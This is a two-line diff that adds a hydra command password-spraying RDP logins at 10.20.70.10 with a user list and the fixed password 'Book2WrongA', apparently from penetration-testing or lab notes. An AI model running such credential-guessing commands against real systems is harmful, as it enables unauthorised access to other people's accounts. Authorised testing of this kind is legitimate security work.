@@ -1,0 +1,2 @@
+hydra -L users-three.txt -p Book2WrongA -t 1 \
+  rdp://10.20.70.10
